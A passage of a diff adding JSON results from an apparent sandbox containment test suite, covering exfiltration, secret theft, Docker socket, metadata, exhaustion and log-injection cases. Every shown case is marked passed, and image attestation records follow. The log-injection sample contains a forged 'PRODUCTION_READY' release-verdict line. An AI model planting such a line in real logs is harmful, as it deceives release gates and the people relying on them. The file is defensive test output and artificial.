+          "denied": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "cross_run_injection",
+        "logs_sha256": "381552a4c83482450301365c612d5d1b4ca4c7a2b8792bb68528fbf61371a46a",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:23.790162Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true}\nTARGET|"
+    },
+    "cross_tenant": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.cross_tenant",
+        "disposition": "DENIED",
+        "kind": "cross_tenant",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.cross_tenant",
+        "completed_at": "2026-07-18T07:06:23.620996Z",
+        "container_id": "33186a52af0a2fc1f2389e767878c47a5dc03a9ffdb9327eebd048909a1d3cc8",
+        "evidence": {
+          "denied": true,
+          "owner_check_denied": true,
+          "visible": []
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "cross_tenant",
+        "logs_sha256": "cafef78157b53002cca1f00153f1c3e8a1f3d95c2111ab13cad21216179f616e",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:22.841627Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true, \"visible\": []}\nTARGET|"
+    },
+    "descriptor_exhaustion": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.descriptor_exhaustion",
+        "disposition": "CONTAINED",
+        "kind": "descriptor_exhaustion",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.descriptor_exhaustion",
+        "completed_at": "2026-07-18T07:06:18.560953Z",
+        "container_id": "3c68aafda552c350c4e44a1ba31f1dc95d2e1f81ee92e5e0c4e8f6da9abe2d7f",
+        "evidence": {
+          "limit_enforced": true,
+          "opened": 61
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "descriptor_exhaustion",
+        "logs_sha256": "e208fbae52a2a33d0b41d1c5e5f4de1748a3baa7484de0348e9abe6ab8b277ba",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:12.666879Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"limit_enforced\": true, \"opened\": 61}\nTARGET|"
+    },
+    "disk_exhaustion": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.disk_exhaustion",
+        "disposition": "CONTAINED",
+        "kind": "disk_exhaustion",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.disk_exhaustion",
+        "completed_at": "2026-07-18T07:06:11.956949Z",
+        "container_id": "02cf8eb911098b4980b3baeac406b541c000a33031bd401ea54ee727f6f457c3",
+        "evidence": {
+          "limit_enforced": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "disk_exhaustion",
+        "logs_sha256": "1613bcd9db722b7bee094e6006c897f3679ab5f5f534af8dde5070df3170891d",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:11.445651Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"limit_enforced\": true}\nTARGET|"
+    },
+    "dns_exfiltration": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.dns_exfiltration",
+        "disposition": "DENIED",
+        "kind": "dns_exfiltration",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.dns_exfiltration",
+        "completed_at": "2026-07-18T07:06:03.603940Z",
+        "container_id": "dd1c43df3655201bec5b001f398280ab3b6b71e0b70087df418d052ccebb2562",
+        "evidence": {
+          "denied": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "dns_exfiltration",
+        "logs_sha256": "381552a4c83482450301365c612d5d1b4ca4c7a2b8792bb68528fbf61371a46a",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:03.033604Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true}\nTARGET|"
+    },
+    "docker_socket": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.docker_socket_access",
+        "disposition": "DENIED",
+        "kind": "docker_socket_access",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.docker_socket_access",
+        "completed_at": "2026-07-18T07:06:04.317399Z",
+        "container_id": "24272db8c0e1fe8f2e6001227e4a49c0c8e9da244e89578dd7e13540919f45a8",
+        "evidence": {
+          "denied": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "docker_socket_access",
+        "logs_sha256": "381552a4c83482450301365c612d5d1b4ca4c7a2b8792bb68528fbf61371a46a",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:03.800221Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true}\nTARGET|"
+    },
+    "environment_theft": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.environment_theft",
+        "disposition": "DENIED",
+        "kind": "environment_theft",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.environment_theft",
+        "completed_at": "2026-07-18T07:06:04.908013Z",
+        "container_id": "9d4c1472fb68b85e5431b05d2c28bcec88e2c1dc9c49f4acec80ad98be313cb9",
+        "evidence": {
+          "blocked_names": [],
+          "denied": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "environment_theft",
+        "logs_sha256": "71173130c3a1824fa5872b9b77408824f80aa9ccdfec4b8b0ac951af21f06850",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:04.460782Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"blocked_names\": [], \"denied\": true}\nTARGET|"
+    },
+    "file_size_exhaustion": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.file_size_exhaustion",
+        "disposition": "CONTAINED",
+        "kind": "file_size_exhaustion",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.file_size_exhaustion",
+        "completed_at": "2026-07-18T07:06:12.536746Z",
+        "container_id": "dc58992abde0ead063b4231cbff717226a0ec3c986d304ee55b6cad8b14052aa",
+        "evidence": {
+          "limit_enforced": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "file_size_exhaustion",
+        "logs_sha256": "1613bcd9db722b7bee094e6006c897f3679ab5f5f534af8dde5070df3170891d",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:12.075746Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"limit_enforced\": true}\nTARGET|"
+    },
+    "log_injection": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.log_injection",
+        "disposition": "DETECTED",
+        "kind": "log_injection",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.log_injection",
+        "completed_at": "2026-07-18T07:06:22.695707Z",
+        "container_id": "cadebc086155a956b626988f642b6766e667440faa2413f182c196049842702f",
+        "evidence": {
+          "detected": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "log_injection",
+        "logs_sha256": "5e312684fc311452cb413ec8bea32d34a57b2f5ae3cd7f234e90ad48f14f227b",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:22.452694Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|release_verdict: PRODUCTION_READY\ufffd\nTARGET|"
+    },
+    "memory_exhaustion": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.memory_exhaustion",
+        "disposition": "CONTAINED",
+        "kind": "memory_exhaustion",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.memory_exhaustion",
+        "completed_at": "2026-07-18T07:06:11.320954Z",
+        "container_id": "f041cdf5dd2a3344dfe64497eb740917d329cc81b905dc7ac0f6859e92ee31e0",
+        "evidence": {
+          "limit_enforced": true
+        },
+        "exit_code": 137,
+        "host_impact": false,
+        "kind": "memory_exhaustion",
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "oom_killed": true,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:10.851234Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|"
+    },
+    "metadata_access": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.metadata_access",
+        "disposition": "DENIED",
+        "kind": "metadata_access",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.metadata_access",
+        "completed_at": "2026-07-18T07:06:02.230990Z",
+        "container_id": "7c027592eac7200f9cdb9b46c44033295ef21acf155bc5eae6768d844c4e468d",
+        "evidence": {
+          "denied": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "metadata_access",
+        "logs_sha256": "7afa3e6bbf8ee8bff345398cc3505ad4313e660701ee902778632d5f42f932fc",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:01.304307Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true, \"targets\": {\"gate\": true, \"internet\": true, \"metadata\": true}}\nTARGET|"
+    },
+    "mount_probing": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.mount_probing",
+        "disposition": "CONTAINED",
+        "kind": "mount_probing",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.mount_probing",
+        "completed_at": "2026-07-18T07:06:06.231339Z",
+        "container_id": "9b779d4fd4c56cd666049be1f6c1d8e03fa0bd87b7f5f602c7cd7fd769eab473",
+        "evidence": {
+          "blocked": [],
+          "sensitive_data_absent": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "mount_probing",
+        "logs_sha256": "af16c05eb0ed28695a8ec569cd20e547abe3cea8fc9dd07047ed7116a2057149",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:05.585069Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"blocked\": [], \"sensitive_data_absent\": true}\nTARGET|"
+    },
+    "network_exfiltration": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.network_exfiltration",
+        "disposition": "DENIED",
+        "kind": "network_exfiltration",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.network_exfiltration",
+        "completed_at": "2026-07-18T07:06:02.230990Z",
+        "container_id": "7c027592eac7200f9cdb9b46c44033295ef21acf155bc5eae6768d844c4e468d",
+        "evidence": {
+          "denied": true,
+          "targets": {
+            "gate": true,
+            "internet": true,
+            "metadata": true
+          }
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "network_exfiltration",
+        "logs_sha256": "7afa3e6bbf8ee8bff345398cc3505ad4313e660701ee902778632d5f42f932fc",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:01.304307Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true, \"targets\": {\"gate\": true, \"internet\": true, \"metadata\": true}}\nTARGET|"
+    },
+    "pid_exhaustion": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.pid_exhaustion",
+        "disposition": "CONTAINED",
+        "kind": "pid_exhaustion",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.pid_exhaustion",
+        "completed_at": "2026-07-18T07:06:07.950618Z",
+        "container_id": "bee8978e19b2e1f1f583e9336456e5f09c0a250d50aa3626efe86cc0ffb6e351",
+        "evidence": {
+          "children": 30,
+          "limit_enforced": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "pid_exhaustion",
+        "logs_sha256": "a00dab79da79059cf3e77bb52fb69129570f8d70db22bda109a2f1566fb6308e",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:06.373374Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"limit_enforced\": true, \"children\": 30}\nTARGET|"
+    },
+    "procfs_inspection": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.procfs_inspection",
+        "disposition": "CONTAINED",
+        "kind": "procfs_inspection",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.procfs_inspection",
+        "completed_at": "2026-07-18T07:06:06.231339Z",
+        "container_id": "9b779d4fd4c56cd666049be1f6c1d8e03fa0bd87b7f5f602c7cd7fd769eab473",
+        "evidence": {
+          "blocked": [],
+          "sensitive_data_absent": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "procfs_inspection",
+        "logs_sha256": "af16c05eb0ed28695a8ec569cd20e547abe3cea8fc9dd07047ed7116a2057149",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:05.585069Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"blocked\": [], \"sensitive_data_absent\": true}\nTARGET|"
+    },
+    "runner_crash": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.runner_crash",
+        "disposition": "CONTAINED",
+        "kind": "runner_crash",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.runner_crash",
+        "completed_at": "2026-07-18T07:06:22.299840Z",
+        "container_id": "79c3c63a3160ba81c230170297134486745a99e2443198c559328436dd1ad3f7",
+        "evidence": {
+          "detected": true
+        },
+        "exit_code": 134,
+        "host_impact": false,
+        "kind": "runner_crash",
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:22.105004Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|"
+    },
+    "secret_file_read": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.secret_file_read",
+        "disposition": "DENIED",
+        "kind": "secret_file_read",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.secret_file_read",
+        "completed_at": "2026-07-18T07:06:05.444415Z",
+        "container_id": "392ea673986e0dabc5f78a55c0fa010e2109289fd089a9c19724cac8c29f437a",
+        "evidence": {
+          "denied": true,
+          "visible": []
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "secret_file_read",
+        "logs_sha256": "cafef78157b53002cca1f00153f1c3e8a1f3d95c2111ab13cad21216179f616e",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:05.043355Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"denied\": true, \"visible\": []}\nTARGET|"
+    },
+    "timeout": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.timeout",
+        "disposition": "TERMINATED",
+        "kind": "timeout",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.timeout",
+        "completed_at": "2026-07-18T07:06:20.885239Z",
+        "container_id": "c35ad1869294bcf4cc4f3c341a743b1d9773a87a64a4302a9cb13bbe116b195b",
+        "evidence": {
+          "detected": true
+        },
+        "exit_code": 137,
+        "host_impact": false,
+        "kind": "timeout",
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:19.235169Z",
+        "timed_out": true,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|"
+    }
+  },
+  "schema_version": "1.0.0",
+  "sealed_image_manifest": {
+    "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+    "passed": true,
+    "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/manifest.json",
+    "record_count": 12,
+    "sha256": "bc86b3ce849d7da82a4378cc2d3693d44e04604d2b1288d740c066408c802c8a",
+    "verification": {
+      "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+      "attestation_public_key": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/p4-attestation-public.pem",
+        "reason": "verified",
+        "verified": true
+      },
+      "base_digest": "sha256:6d43704baacd1bfbe7c295d7f13079d5d8104ed33568873133f8fc69980419df",
+      "failures": [],
+      "manifest_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/manifest.json",
+      "manifest_sha256": "bc86b3ce849d7da82a4378cc2d3693d44e04604d2b1288d740c066408c802c8a",
+      "passed": true,
+      "record_count": 12,
+      "records": [
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+            "reasons": [],
+            "role": "anchor"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "anchor.a",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:f0c559f0d754f05c76f8153af64c4d81c8b5c357e75fb3879c482db8f3108a03",
+            "reasons": [],
+            "role": "anchor"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/b/anchor-b.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/b/anchor-b.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/b/anchor-b.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/b/anchor-b.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/b/anchor-b.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/b/anchor-b.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "anchor.b",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+            "reasons": [],
+            "role": "custody"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "custody.a",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:cd8df2e1159641b4794261539c8168e8af77aee2505566d62b59e1abe51d7889",
+            "reasons": [],
+            "role": "custody"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/b/custody-b.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/b/custody-b.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/b/custody-b.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/b/custody-b.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/b/custody-b.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/b/custody-b.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "custody.b",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
+            "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+            "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+            "reasons": [],
+            "role": "runner"
+          },
+          "artifacts": {
+            "admission_policy": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.admission-policy.json",
+              "reason": "verified"
+            },
+            "attestation": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.attestation.json",
+              "reason": "verified"
+            },
+            "provenance": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.provenance.json",
+              "reason": "verified"
+            },
+            "runtime_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.runtime.json",
+              "reason": "verified"
+            },
+            "sbom": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.spdx.json",
+              "reason": "verified"
+            },
+            "vulnerability_scan": {
+              "ok": true,
+              "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.vulnerability.json",
+              "reason": "verified"
+            }
+          },
+          "attestation": {
+            "reason": "verified",
+            "valid": true
+          },
+          "passed": true,
+          "record": "runner.a",
+          "sbom": {
+            "reason": "verified",
+            "valid": true
+          }
+        },
+        {
+          "admission": {
+            "allowed": true,
